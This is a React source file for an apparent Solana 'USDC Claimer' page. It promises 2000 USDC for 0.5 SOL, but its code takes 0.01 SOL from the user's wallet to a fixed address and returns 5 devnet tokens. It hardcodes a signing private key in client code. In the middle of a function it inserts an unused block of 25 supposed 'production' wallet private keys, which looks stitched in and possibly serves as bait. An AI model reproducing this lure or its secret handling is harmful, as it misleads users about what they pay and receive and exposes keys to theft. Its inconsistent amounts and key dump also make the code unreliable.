/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "67geJdpdXMPMGsMT3t8TBfbwqCtR5ADoehkGEtXRmuuTburiyw13YvHhYWTdredhRvJKTNc2XLUCGHrk7x1GJb7c"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2Ee5FdT9Kp7zeQ5zMUm4ChPj9BtXyyFcYLNaZYrDPMTLebDqDPF2wJTbwYsAjJ2Qbaxu4vi7HS2D762gtQ23XJu1",
  "key1": "4zMq7Ngb67Ht5PixbR8Vyh4Pb6YUnRDnrauVgphwTNnsYQJdF1DVAvuMTo1cSqaX8hQHCQ4h7kGGRBWfErnuTzKJ",
  "key2": "4WGMfGgvYdUcMCTQMsDi97C6QRjSLLGDJRm8Q4pXma4pSQfCiLMpDET2Vvq8CnXKiihG5iSdLZMD3TCeptSuANG",
  "key3": "4GyxViAcyoWqk71axYgrjuH6nB93vE8FWHsXhEG74b2bL38woFKitLPsSBRRMPpHCCcQEbn3T6FfeeXYjUxgaaGk",
  "key4": "5ArFTVvxkJsPB36DFw5HNTtBao2a77Xd4tvrWUjfebDsE1Sq8t7CwV5bmPjhAQDAoBzAiYgWEpoRRWmge8jzJfvt",
  "key5": "5nYQRQhPgEA3DSgojHLs9t298vzU4UNQu8TnNHJMM1LmTkHsPbHxkfVuLTZ1CSwXGYaeXmZVp85oCfnRUUXvierP",
  "key6": "5UdAY7cKrqufaa71ib9heob8szsrfa23SoKhwbJ6JWoD1ekaj1TiigRAGdrXxwKp1anmwDLVEqHQKkaVqNmWG6cv",
  "key7": "3EHKMNKRNizBuvDfGRtjTPCMqEL8bW55hZSqcvEufytDFfbV8fm632jxcjJGG78vtEGFDcEBSJP7rGVWMXzUJUse",
  "key8": "Hti3Ct2CdeEfBz65xdyFwUNfCgUmdGr9rD2x565k2tya68y1ckTXBddHV1775h4NinYV6RRcMkGUsc9KPxsLapG",
  "key9": "5w7ubxQYuwejf7khaxWvYKpPP13GVM8SH1Zbu9fqX2EFijXwbU7c22ByBGy9WEKJFY4Zk7zguLvo4NRKEeUQMPAx",
  "key10": "2shkgX3818anZjqLbnCDCdqTaTjPd4jRAmQFuw12iNduNVAr6HHY5gbdciMKMxDjK4Ar8cMvdUV9EPWAhWWAWQVM",
  "key11": "5mrx72fWXffC41tSCWuTh6Gz1YNMRwWu1UMyVuWANKLAfzNyqTAPSamKLukDo6KH8qdf8LQwV6sg5Sg2YiGbzvg7",
  "key12": "2MajzPUPEwYYCA5Yb3h7B6V4TZkHtcWcmZtNK7zwMRcGHKEV3LzJr6mLkLxD2PuTj59ryq2t6E69Z3xDskAc6cKh",
  "key13": "2GV4VZuYVMe8eBBzDARHTNcDr5jnF6TwyvdnAW5NJGB3yGZ1Ka3fX1FMgPWg6zWFRZ1rQBuVLLiaG6ChF5AiqBr1",
  "key14": "4CkPLMFRxkVEa2qUfEFGQ2FQvkVsevETGqDrwJ2ijhkQGTkiyCHQML14NZEFJiUbGGoKYLNLMCkj6A1e66izR24m",
  "key15": "66hpZgAfrAYNtrc6xtaqpdtVqyvz8nqPn7B9G6MF7tRX55EmLTQb1hnAYWUD8u2n9N56VjYsovVcqXWs5G2KTY44",
  "key16": "51GBRMCaddp2AkrrWjsTGTCyWoeyj42T9DoD2xcuSiwFeBobw1wuLDeH3Hi2hz4VsQEgL3Jgqri8A5LC5Qxn9bP1",
  "key17": "3StsTELu21UJXdmFfMwJXo9dUP4ZSwELS3ZLx8mG1TxsQS6pizMEUxevrq5YoEsXgn79EMrvrLJbZ1cWFnpqaEeL",
  "key18": "5f9kja893PYePJsCDMJyg6bmU5ikh3kvgCaGUKn99AFJr4rBMdAb6gxrNKuMM9EotNVD22GRDoSAsCbXiUbz1Co2",
  "key19": "5vKPkgarfL44DDTEXAjRtSBWgB17PYPh5BXdSE7i4naZ3jBXY3ycG8XtaLxunSZs33J3EPCcXi55EvxMtNbc8kGd",
  "key20": "2eFfvQgRZQ5oG1YEBTrTQiuKtmcbFGs1EGsMoPzL5BrUf2cGxXGg3yBfHBEhvHC65vCsx2EQNKNe95q9txvqdsfd",
  "key21": "3KpTGSavVtHahWwmPYanoLeMGNKych1rPY3F7Qzics3Sjne86BuQFRHJ8jwQeZkp6iR8dmMxjrKuXtq5vUWHyQfr",
  "key22": "MPLatyHkFqgLYd6UgNV37iPX6CNJj4GixzvqcJ28Ud7rj4hr6AiRcfC94stoSNUFx4Dtnn23gqSqvakrzJFsFga",
  "key23": "23FWafL6Dd1FA7QcZhUqRbufnZo8ipgDJd5qX5rq53WmG23MAmMhqN2rzpNEKSXseAnhKAeehDZcxZCBzeK5iwFH",
  "key24": "3bHk3FdfHb3DjiE2dE6DhMA1Dcp1ChpzgLCsm2BhiWMVQEXjwhmvfDVMAXozkyx1Yzip1NwohxacvM6nrunikExK"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
